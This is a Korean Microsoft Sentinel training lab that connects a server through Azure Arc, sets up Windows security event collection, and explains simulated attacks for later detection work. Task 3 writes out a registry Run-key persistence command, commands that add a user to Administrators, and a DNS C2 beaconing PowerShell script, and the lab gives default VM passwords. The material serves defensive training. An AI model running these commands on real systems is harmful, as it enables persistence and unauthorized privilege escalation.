---
lab:
  title: 연습 5 - 시뮬레이션된 공격 수행 준비
  module: Learning Path 9 - Create detections and perform investigations using Microsoft Sentinel
---

# 학습 경로 9 - 랩 1 - 연습 5 - 시뮬레이션된 공격 수행 준비

## 랩 시나리오

![랩 개요입니다.](../Media/SC-200-Lab_Diagrams_Mod9_L1_Ex5.png)

### 이 랩의 예상 완료 시간은 30분입니다.

### 작업 1: 온-프레미스 서버 연결

이 작업에서는 온-프레미스 서버를 Azure 구독에 연결합니다. Azure Arc가 이 서버에 미리 설치되었습니다. 이 서버는 다음 연습에서 나중에 Microsoft Sentinel에서 검색 및 조사할 시뮬레이션 공격을 실행하는 데 사용됩니다.

>**중요:** 학습 경로 #9에 대한 랩 연습은 *독립 실행형* 환경에 있습니다. 완료하기 전에 랩을 종료하면 구성을 다시 실행해야 합니다.

1. **WINServer** 가상 머신에 Administrator로 로그인합니다. 암호로는 **Passw0rd!** 를 사용합니다. 다시 장착합니다.  

위에서 설명한 대로 Azure Arc는 **WINServer** 컴퓨터에 사전 설치되어 있습니다. 이제 이 컴퓨터를 Azure 구독에 연결합니다.

1. *WINServer* 컴퓨터에서 *검색* 아이콘을 선택하고 **cmd**를 입력합니다.

1. 검색 결과에서 *명령 프롬프트*를 마우스 오른쪽 단추로 클릭하고 **관리자 권한으로 실행**을 선택합니다.

1. 명령 프롬프트 창에서 다음 명령을 입력합니다. *Enter 키를 누르지 않습니다.*

    ```cmd
    azcmagent connect -g "defender-RG" -l "EastUS" -s "Subscription ID string"
    ```

1. **구독 ID 문자열**을 랩 호스팅 서비스 공급자가 제공한 *구독 ID*로 바꿉니다(*리소스 탭). 따옴표를 유지해야 합니다.

1. **Enter** 키를 입력하여 명령을 실행합니다(몇 분 정도 걸릴 수 있습니다).

1. *로그인* 대화 상자에서 랩 호스팅 제공업체에서 제공한 **테넌트 이메일**과 **테넌트 비밀번호**를 입력하고 **로그인**을 선택합니다. *인증 완료* 메시지를 기다렸다가 브라우저 탭을 닫고 *명령 프롬프트* 창으로 돌아갑니다.

1. 명령 실행이 완료되면 *명령 프롬프트* 창을 열어두고 다음 명령을 입력하여 연결이 성공했는지 확인합니다.

    ```cmd
    azcmagent show
    ```

1. 명령 출력에서 *에이전트 상태*가 **연결됨**인지 확인합니다.

## 작업 2: 비 Azure Windows 컴퓨터 연결

이 작업에서는 Azure Arc에 연결된 온-프레미스 머신을 Microsoft Sentinel에 추가합니다.  

>**참고:** Microsoft Sentinel이 Azure 구독에 **defenderWorkspace**라는 이름으로 사전 배포되었으며 필요한 *콘텐츠 허브* 솔루션이 설치되어 있습니다.

1. **WIN1** 가상 머신에 Admin으로 로그인합니다. 암호로는 **Pa55w.rd**를 사용하여 로그인합니다.  

1. Microsoft Edge 브라우저에서 <https://portal.azure.com>의 Azure Portal로 이동합니다.

1. 랩 호스팅 공급자가 제공한 **테넌트 전자 메일** 계정을 복사하여 **로그인** 대화 상자에 붙여 넣은 후 **다음**을 선택합니다.

1. 랩 호스팅 공급자가 제공한 **테넌트 암호**를 복사하여 **암호 입력** 대화 상자에 붙여 넣은 후 **로그인**을 선택합니다.

1. Azure Portal의 검색 창에 *Sentinel*을 입력하고 **Microsoft Sentinel**을 선택합니다.

1. Microsoft Sentinel **defenderWorkspace**을 선택합니다.

1. Microsoft Sentinel 왼쪽 탐색 메뉴에서 *구성* 섹션까지 아래로 스크롤하여 **데이터 커넥터**를 선택합니다.

1. *데이터 커넥터*에서 **AMA를 통한 Windows 보안 이벤트** 솔루션을 검색하여 목록에서 선택합니다.

1. *AMA를 통한 Windows 보안 이벤트* 세부 정보 창에서 **커넥터 페이지 열기**를 선택합니다.

    >**참고:** *Windows 보안 이벤트* 솔루션은 *AMA를 통한 Windows 보안 이벤트*와 *레거시 에이전트를 통한 보안 이벤트* 데이터 커넥터를 모두 설치합니다. 또한 2개의 통합 문서, 20개의 분석 규칙 및 43개의 헌팅 쿼리가 포함되어 있습니다.

1. *구성* 섹션의 *지침* 탭에서 **데이터 수집 규칙 만들기**를 선택합니다.

1. 규칙 이름에 **AZWINDCR**을 입력하고 **다음: 리소스**를 선택합니다.

1. *리소스* 탭의 *범위*에서 *구독*을 확장합니다.

    >**힌트:** *범위* 열 앞에 있는 ">"를 선택하여 전체 *범위* 계층 구조를 확장할 수 있습니다.

1. **defender-RG** 리소스 그룹을 확장한 다음 **WINServer**를 선택합니다.

1. **다음: 수집**을 선택하고 *모든 보안 이벤트*를 선택한 상태로 둡니다.

1. 완료되면 **다음: 리뷰 + 만들기**를 클릭합니다.

1. *유효성 검사 통과*가 표시되면 **만들기**를 선택합니다.

### 작업 3: 공격 이해

>**중요: 이 연습에서는 작업을 수행하지 않습니다.**  이러한 지침은 다음 연습에서 수행할 공격에 대한 설명일 뿐입니다. 이 페이지를 주의 깊게 읽으세요.

공격 패턴은 오픈 소스 프로젝트(<https://github.com/redcanaryco/atomic-red-team>)를 기반으로 합니다.

#### 공격 1 - 레지스트리 키 추가를 통한 지속성

공격자는 레지스트리 실행 키에 프로그램을 추가합니다. 이렇게 하면 사용자가 로그온할 때마다 프로그램을 실행하여 지속성을 달성합니다.

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### 공격 2 - 사용자 권한 추가 및 상승

이 공격에서는 공격자가 새 사용자를 추가한 다음 권한을 Administrators 그룹으로 높입니다. 그러면 권한이 있는 다른 계정으로 로그온할 수 있게 됩니다.

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

#### 공격 3 - DNS/C2

공격자는 대량의 DNS 쿼리를 명령 및 제어(C2) 서버로 보냅니다. 의도는 단일 원본 시스템 또는 단일 대상 도메인에서 DNS 쿼리 수에 대한 임계값 기반 검색을 트리거하는 것입니다.

```
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```

### 작업 4: 탐지 모델 이해

이 랩에서 사용하는 공격 검색 구성 주기에는 모든 데이터 원본이 포함됩니다. 하지만 실제로는 두 가지 데이터 원본만 중점적으로 검색합니다.

검색을 작성하려면 먼저 KQL 문을 작성해야 합니다. 여기서는 호스트를 공격할 것이므로 KQL 문 작성을 시작하는 데 필요한 대표 데이터가 제공됩니다.

KQL 문을 완성한 후에는 분석 규칙을 만듭니다.

규칙이 트리거되어 경고와 인시던트가 생성되면 조사를 진행하여 보안 운영 분석자의 조사 과정에 도움이 되는 필드가 제공되고 있는지를 확인합니다.

다음으로, 분석 규칙에 다른 변경을 적용합니다.

>**참고:** 일부 경고는 이 랩의 목적에 따라 더 짧은 기간에 트리거됩니다.

## 연습 6 계속 진행
